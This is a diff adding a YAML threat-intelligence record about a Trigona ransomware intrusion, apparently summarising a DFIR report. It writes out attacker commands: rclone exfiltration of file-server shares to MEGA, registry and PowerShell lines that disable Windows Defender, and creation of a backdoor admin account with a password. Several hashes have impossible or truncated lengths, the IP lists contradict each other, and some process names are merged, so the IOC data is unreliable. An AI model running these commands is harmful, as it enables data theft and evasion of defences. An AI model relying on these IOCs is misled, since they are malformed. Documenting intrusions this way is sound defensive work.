@@ -1,0 +1,123 @@
+description: Threat actors gained RDP access and deployed Trigona ransomware with
+  data exfiltration via rclone to Mega.io.
+attribution: Unknown threat actor, likely an APT group
+malware_families:
+- Trigona
+TTPs:
+  processes:
+  - DefenderOFF.bat
+  - DefenderON.bat
+  - ipall.bat
+  - ipinfo.bat
+  - ipwho.bat
+  - openrdp.bat
+  - newuser.bat
+  - psNET.bat
+  - start
+  - konua
+  - konvA.bat
+  - konus.bat
+  - Trigona
+  - Ransomware
+  - build_redacted.exe
+  - netscan.exe
+  - rclone.exe
+  - whoami.exenet.exe
+  commandline:
+  - cmd /c "C:\\Users\\Administrator\\Music\\start .bat" --> cd %~dp0 --> rclone.exe
+    copy "\\[FILE SERVER]\\human resources" MEGA:domain -q --ignore-existing --auto-confirm
+    --multi-thread-streams 12 --transfers 12
+  - cmd /c "C:\\Users\\Administrator\\Music\\start    .bat" --> cd %~dp0 --> rclone.exe
+    copy "\\[FILE SERVER]\\Files" MEGA:domain -q --ignore-existing --auto-confirm
+    --multi-thread-streams 12 --transfers 12
+  powershell:
+  - Set-MpPreference -DisableRealtimeMonitoring $true
+  - Set-MpPreference -MAPSReporting 0
+  - Set-MpPreference -SubmitSamplesConsent 2
+  scripting_engine:
+  - batch scripts
+  registry_keys:
+  - REG ADD "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer"
+    /v "HideSCAHealth" /t REG_DWORD /d 0x1 /f
+  - REG ADD "HKCU\\Software\\Policies\\Microsoft\\Windows\\Explorer" /v "DisableNotificationCenter"
+    /t REG_DWORD /d 0x1 /f
+  - REG DELETE "HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run" /v "SecurityHealth"
+    /f
+  - REG ADD "HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows Defender" /v "DisableAntiSpyware"
+    /t REG_DWORD /d 0x1 /f
+  - REG ADD "HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows Defender" /v "AllowFastServiceStartup"
+    /t REG_DWORD /d 0x0 /f
+  - REG ADD "HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows Defender" /v "ServiceKeepAlive"
+    /t REG_DWORD /d 0x0 /f
+  - REG ADD "HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows Defender\\Real-Time Protection"
+    /v "DisableIOAVProtection" /t REG_DWORD /d 0x1 /f
+  - REG ADD "HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows Defender\\Real-Time Protection"
+    /v "DisableRealtimeMonitoring" /t REG_DWORD /d 0x1 /f
+  - REG ADD "HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows Defender\\Spynet" /v "DisableBlockAtFirstSeen"
+    /t REG_DWORD /d 0x1 /f
+  - REG ADD "HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows Defender\\Spynet" /v "LocalSettingOverrideSpynetReporting"
+    /t REG_DWORD /d 0x0 /f
+  - REG ADD "HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows Defender\\Spynet" /v "SubmitSamplesConsent"
+    /t REG_DWORD /d 0x2 /f
+  - REG ADD "HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows Defender\\UX Configuration"
+    /v "NotificationSuppress" /t REG_DWORD /d 0x1 /f
+  image_load: []
+  network_connections:
+  - process: rclone.exe
+    destination: mega.io
+    port: 443
+  - process: DefenderOFF.bat
+    destination: 77.83.36.61
+    port: ''
+  - process: DefenderON.bat
+    destination: 93.106.31.98
+    port: ''
+  - process: rclone.exe
+    destination: Mega.io
+    port: ''
+  file_activity:
+  - C:\\Users\\Administrator\\Music\\start .bat
+  - C:\\Users\\Administrator\\Music\\start    .bat
+  - netscan.xml
+  - build_redacted.exe
+  - netscan.exe
+  - rclone.exe
+  persistence:
+  - net user sys Taken1918 /add
+  - net localgroup Administrators sys /add
+  - net localgroup "Remote Desktop Users" sys /add
+  - reg add "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run" /v <random>
+    /t REG_SZ /d "C:\\ALLibraries\\build_redacted.exe"
+  process_relations: []
+IOCs:
+  hashes:
+  - 1852be15aa8dcf664291b3849bd348e4eea811d2a304101cc0b0edebe6590ea0f3da0a27
+  - c5d7ce243c1d735d9ca419cc916b87ec21b7460aa5f7eb7a064d2a7a6837da57719f9c2e
+  - d6d8302d8db7f17aaa45059b60eb8de33166c95d1d833ca4d5061201e4737009
+  - b2bb4d49c38f06a42f15b39744d425d02f5991e67615763865b7e4c4c9558eb447ed7c0d
+  - 12f838b54c6dac78f348828fe34f04ac355fa8cc24f8d7c7171d310767463c6c
+  - 718f68b24d1e331e60e1a10c92a81961a73fbffe33ea82b20c4129e552fbc5b76891080e
+  - 40fe2564e34168bf5470bbe0247bc614117334753a107b2baeb113154b4de6a7
+  - 09dcedb5a6ad0ef5bbea4496486ba4e5723baea0983b283eebd8331025a52eb13d5daaa7
+  - 277550c9d5771a13b65e90f5655150e365516215a714ffd3f075b5b426e2ddc1
+  - 0fd71d43c1f07d6a8fa73b0fa7beffa752f7e3437d83e964cb2fcc1175fad0611a12e26c35ff76d763714812486a2f6ad656d124f3fcdfc4d16d49df6221325c8ae8827a
+  - ca49787e7ea3b81fccca2ae45852a3d61b65d347bea374bb9915c445382ae696ba4064d47f7e61246445872aec37808a2c20f5f055fb5fba8bd3f5af5194762114700180
+  - cf39e14df6c95285f23cd6d16a2a8a4ed5d686acb2ad66fa2e01bbfc4e166df80dc76d060596b08f0f4c6526b568fc7c9d55abd95230a48feb07b67482392d31c40f3aea
+  - 44370f5c977e415981febf7dbb87a85cac0dce3b0f5b8d187a2e3f29efc358538fd4aa4556b08aa03bd8c0ea094cfeb03d5954ffd857bac42df929dc835eea62f32b09e0
+  - 3bce26176509adf3f9d8e2e274d92f9800
+  ips:
+  - 77.83.36.6
+  - 193.106.31.98
+  domains:
+  - mega.io
+  - Mega.io
+  ip_addresses:
+  - 77.83.36.61
+  - 93.106.31.98
+authors:
+- MetallicHack
+- pcsc0ut
+- unnamed contributor 3 (UC3)
+reference: https://thedfirreport.com/2024/01/29/buzzing-on-christmas-eve-trigona-ransomware-in-3-hours
+date_of_publication: January 29, 2024
+file_creation_date: September 10, 2025
